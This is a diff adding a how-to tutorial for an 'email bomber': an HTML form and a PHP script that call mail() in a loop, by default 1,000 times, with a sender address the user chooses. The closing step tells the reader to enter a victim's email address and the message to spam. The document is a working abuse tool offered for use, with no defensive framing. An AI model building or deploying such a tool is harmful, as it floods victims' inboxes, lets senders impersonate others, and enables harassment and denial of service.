@@ -1,0 +1,71 @@
+You’ll Need:
+1 Webhosting – Make Sure You Have SMTP Or It Wont Work
+Small Knowledge About PHP And HTML
+
+
+ 
+Steps:
+1. So first we will want to create a file called “index.html”
+2. We will place the following code  in the index.html
+
+Code:
+<html>
+<head>
+<title>Email Bomber</title>
+</head>
+<body>
+  <center>
+   <h1 style=”color:white;font-shadow:0px 0px 2px blue;”>Simple Email Bomber</h1><br>
+         <!–This is where the forms starts–>
+    <form action=”email.php” method=”post”><br>
+        Email: <input type=”text” name=”email” /><br>
+        Amount to send : <input type=”text” name=”spam” /><br>
+        Subject: <input type=”text” name=”subject” /><br>
+        Message: <TEXTAREA NAME=”message” ROWS=6 COLS=40></TEXTAREA><br>
+        From: <input type=”text” name=”from” /><br>
+        <input type=”submit” value=”send” /><input type=”reset” />
+    </form>
+   </center>
+</body>
+</html>
+
+3. Go ahead and save that file in a folder, name the folder what-ever you want.
+4. Now in that folder go ahead and create a file named “email.php”
+5. Now open the email.php and place the following code inside it.
+
+Code:
+<?php  
+ 
+    $num = 1;
+    $email = $_POST[’email’];
+    $spam = $_POST[‘spam’];
+    $subject = $_POST[‘subject’];
+    $message = $_POST[‘message’];
+    $from = $_POST[‘from’];
+    $send = $_POST[‘send’];
+    if($spam==’ ‘)
+    {
+      $spam = 1000; // this is for if the Amount to send = nothing then it will send 1000 emails
+           // you can change it too what-ever you want.
+    }
+   
+   
+    if($spam!=” && $email==”)
+    {
+        die(‘Please enter an email!.’);
+    }
+   
+    if($email != ”)
+    {
+        while($num<=$spam)
+        {
+            mail ($email, $subject, $message, “From: ” . $from);
+            echo $num . “<br>”;
+            $num++;
+        }  
+    }
+?>
+
+6. Now you can go ahead and upload it to your server, and boom.
+
+Now you should be able to go to your domain/url and find that theres a panel there, go ahead and fill it out with your victims email & the message to send/spam and press the send button.
